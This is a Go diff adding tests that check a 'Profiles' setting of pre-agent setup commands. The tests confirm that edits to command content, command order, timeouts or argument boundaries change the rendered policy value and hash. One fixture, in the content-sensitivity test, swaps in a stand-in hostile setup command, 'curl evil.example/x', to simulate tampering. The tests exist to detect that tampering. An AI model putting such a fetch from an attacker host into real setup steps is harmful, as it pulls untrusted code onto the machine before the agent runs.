@@ -5,6 +5,7 @@ import (
 	"os"
 	"path/filepath"
 	"testing"
+	"time"
 )
 
 func fieldByName(fs []Field, name string) (Field, bool) {
@@ -213,6 +214,74 @@ func TestExplain_DiffPolicyProvenance(t *testing.T) {
 	}
 }
 
+// Profiles is enforced pre-agent policy: it must appear in the provenance
+// table as a yaml-only field (no env override), attribute to config.yaml
+// exactly when the yaml configures any repo, and stay in the
+// policy-comparison set.
+func TestExplain_ProfilesProvenance(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+
+	// Absent from yaml → default, rendered "disabled".
+	fields, _, err := Explain(filepath.Join(t.TempDir(), "missing.yaml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	f, ok := fieldByName(fields, "Profiles")
+	if !ok {
+		t.Fatal("Profiles missing from Explain provenance")
+	}
+	if f.EnvVar != "" {
+		t.Errorf("Profiles must be yaml-only, got env var %q", f.EnvVar)
+	}
+	if f.YAMLKey != "profiles" {
+		t.Errorf("Profiles yaml key = %q, want profiles", f.YAMLKey)
+	}
+	if f.Source != SourceDefault {
+		t.Errorf("Profiles source = %q, want %q when absent", f.Source, SourceDefault)
+	}
+	if f.Value != "disabled" {
+		t.Errorf("Profiles value = %q, want disabled", f.Value)
+	}
+
+	// Set in yaml → config.yaml, compact summary.
+	yaml := "network: x\ngateway_ip: 1.2.3.4\n" +
+		"profiles:\n  repos:\n    \"github.com/o/r\":\n" +
+		"      setup:\n        - [\"npm\", \"ci\"]\n        - [\"npm\", \"run\", \"build\"]\n" +
+		"      readiness:\n        - [\"curl\", \"-fsS\", \"localhost:3000\"]\n" +
+		"      timeout: 10m\n"
+	path := filepath.Join(t.TempDir(), "c.yaml")
+	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	fields, _, err = Explain(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	f, ok = fieldByName(fields, "Profiles")
+	if !ok {
+		t.Fatal("Profiles missing from Explain provenance")
+	}
+	if f.Source != SourceYAML {
+		t.Errorf("Profiles source = %q, want %q when yaml sets it", f.Source, SourceYAML)
+	}
+	want := fmt.Sprintf("1 repos / 2 setup / 1 readiness (%s)",
+		profilesHash(map[string]SetupProfile{
+			"github.com/o/r": {
+				Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
+				Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+				Timeout:   10 * time.Minute,
+			},
+		}))
+	if f.Value != want {
+		t.Errorf("Profiles value = %q, want %q", f.Value, want)
+	}
+
+	// It shapes what runs pre-agent — it must survive PolicyComparisonFields.
+	if _, ok := fieldByName(PolicyComparisonFields(fields), "Profiles"); !ok {
+		t.Error("Profiles must stay in the policy-comparison field set")
+	}
+}
+
 // The rendered DiffPolicy value feeds EffectiveHash, which is the divergence
 // comparison unit for `drydock policy explain`. If the glob lists collapsed to
 // bare counts, editing a blocked glob (security enforcement) without changing
@@ -254,5 +323,120 @@ func TestExplain_DiffPolicyValueIsGlobContentSensitive(t *testing.T) {
 	// The fully-zero block still renders exactly "disabled".
 	if got := renderDiffPolicy(DiffPolicy{}); got != "disabled" {
 		t.Errorf("zero DiffPolicy = %q, want disabled", got)
+	}
+}
+
+// The rendered Profiles value feeds EffectiveHash, the divergence comparison
+// unit for `drydock policy explain`. A count-only summary would let an edit to
+// a setup command's CONTENT (pre-agent execution with egress — the
+// highest-severity surface) slip through as "in sync" whenever the counts
+// stayed equal. Pin the properties that prevent that:
+//   - equal counts, different command content → different value and hash;
+//   - repo ORDER is not semantic (maps are unordered; blocks sort by key) →
+//     identical value;
+//   - command ORDER within a repo IS semantic (`npm ci` must run before
+//     `npm run build`, so reordering is a real config change) → different value.
+func TestExplain_ProfilesValueIsCommandContentSensitive(t *testing.T) {
+	base := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+
+	// Same counts everywhere, different setup command content → must differ.
+	edited := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "ci"}, {"curl", "evil.example/x"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+	vBase, vEdited := renderProfiles(base), renderProfiles(edited)
+	if vBase == vEdited {
+		t.Errorf("equal-count configs with different setup commands rendered identically: %q", vBase)
+	}
+	fBase := []Field{{Name: "Profiles", Value: vBase}}
+	fEdited := []Field{{Name: "Profiles", Value: vEdited}}
+	if EffectiveHash(fBase) == EffectiveHash(fEdited) {
+		t.Error("EffectiveHash unchanged after a setup command edit — divergence would go undetected")
+	}
+
+	// Same content, repos inserted in the opposite order → repo order is not
+	// semantic (per-repo blocks sort by key), values must match.
+	repoReordered := map[string]SetupProfile{}
+	repoReordered["github.com/o/s"] = base["github.com/o/s"]
+	repoReordered["github.com/o/r"] = base["github.com/o/r"]
+	if v := renderProfiles(repoReordered); v != vBase {
+		t.Errorf("repo-reordered config rendered differently: %q vs %q — spurious divergence", v, vBase)
+	}
+
+	// Same commands, swapped order within one repo's setup list → execution
+	// order is significant, so this is a real change and MUST differ.
+	cmdReordered := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     [][]string{{"npm", "run", "build"}, {"npm", "ci"}},
+			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
+		},
+		"github.com/o/s": {
+			Setup: [][]string{{"make", "deps"}},
+		},
+	}
+	if v := renderProfiles(cmdReordered); v == vBase {
+		t.Errorf("reordering commands within a repo rendered identically (%q) — execution-order change would go undetected", v)
+	}
+
+	// Same commands, timeout-only edit → the timeout is a documented hard
+	// bound on setup execution, so a daemon-vs-config timeout drift is real
+	// divergence and MUST flip the value/hash.
+	timeoutEdited := map[string]SetupProfile{
+		"github.com/o/r": {
+			Setup:     base["github.com/o/r"].Setup,
+			Readiness: base["github.com/o/r"].Readiness,
+			Timeout:   10 * time.Minute,
+		},
+		"github.com/o/s": base["github.com/o/s"],
+	}
+	vTimeout := renderProfiles(timeoutEdited)
+	if vTimeout == vBase {
+		t.Errorf("timeout-only edit rendered identically (%q) — timeout divergence would go undetected", vTimeout)
+	}
+	if EffectiveHash([]Field{{Name: "Profiles", Value: vTimeout}}) == EffectiveHash(fBase) {
+		t.Error("EffectiveHash unchanged after a timeout-only edit — divergence would go undetected")
+	}
+
+	// Same characters, different argv element boundaries → a space-join would
+	// render ["sh","-c","a b"] and ["sh","-c","a","b"] identically; the
+	// quoted encoding must keep them distinct.
+	oneArg := map[string]SetupProfile{
+		"github.com/o/r": {Setup: [][]string{{"sh", "-c", "a b"}}},
+	}
+	twoArgs := map[string]SetupProfile{
+		"github.com/o/r": {Setup: [][]string{{"sh", "-c", "a", "b"}}},
+	}
+	vOne, vTwo := renderProfiles(oneArg), renderProfiles(twoArgs)
+	if vOne == vTwo {
+		t.Errorf("argv-boundary edit rendered identically: %q — [\"sh\",\"-c\",\"a b\"] and [\"sh\",\"-c\",\"a\",\"b\"] collide", vOne)
+	}
+
+	// Rendering must not have mutated the caller's config.
+	if got := base["github.com/o/r"].Setup[0][0]; got != "npm" || base["github.com/o/r"].Setup[0][1] != "ci" {
+		t.Errorf("renderProfiles mutated the caller's setup commands: first cmd now %q", got)
+	}
+	if base["github.com/o/r"].Setup[1][2] != "build" || base["github.com/o/s"].Setup[0][0] != "make" {
+		t.Error("renderProfiles mutated the caller's setup commands")
+	}
+
+	// The empty map still renders exactly "disabled".
+	if got := renderProfiles(nil); got != "disabled" {
+		t.Errorf("nil profiles = %q, want disabled", got)
+	}
+	if got := renderProfiles(map[string]SetupProfile{}); got != "disabled" {
+		t.Errorf("empty profiles = %q, want disabled", got)
 	}
 }
